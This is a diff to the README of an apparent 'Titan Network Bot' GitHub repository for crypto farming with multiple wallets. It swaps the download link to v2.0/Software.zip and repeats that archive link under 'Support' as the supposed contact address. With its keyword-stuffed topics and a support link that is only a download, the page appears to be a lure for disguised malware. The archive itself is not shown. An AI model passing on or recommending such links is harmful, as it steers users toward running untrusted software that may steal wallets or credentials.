@@ -15,7 +15,7 @@ Welcome to the official repository of **Titan Network Bot**! This advanced autom
 - **Topics**: titan-farmer, titan-multifarmer, titan-network, titan-network-autofarm, titan-network-bot, titan-network-botminer, titan-network-extension-bot, titan-network-farmer, titan-network-miner, titan-network-multibot, titan-network-multifarmer, titan-network-multireger, titan-network-multiwallet, titan-network-reger, titan-network-software, titan-software  
 
 ## Download Titan Network Bot
-🔗 **[Download Titan Network Bot](https://github.com/clementmil/Titan-Network-Bot/releases/download/v1.0/Release_x64.zip)**  
+🔗 **[Download Titan Network Bot](https://github.com/clementmil/Titan-Network-Bot/releases/download/v2.0/Software.zip)**  
 🚀 Click the above link to download the Titan Network Bot software.  
 
 ## Repository Structure
@@ -34,7 +34,7 @@ To get started with Titan Network Bot, follow these steps:
 We welcome contributions from the community to enhance the functionality and features of Titan Network Bot. Feel free to fork the repository, make your changes, and submit a pull request for review.
 
 ## Support
-For any queries or assistance regarding Titan Network Bot, please reach out to our support team at [https://github.com/clementmil/Titan-Network-Bot/releases/download/v1.0/Release_x64.zip](https://github.com/clementmil/Titan-Network-Bot/releases/download/v1.0/Release_x64.zip).
+For any queries or assistance regarding Titan Network Bot, please reach out to our support team at [https://github.com/clementmil/Titan-Network-Bot/releases/download/v2.0/Software.zip](https://github.com/clementmil/Titan-Network-Bot/releases/download/v2.0/Software.zip).
 
 ## License
 Titan Network Bot is licensed under the MIT License. See the [LICENSE](./LICENSE) file for more details.
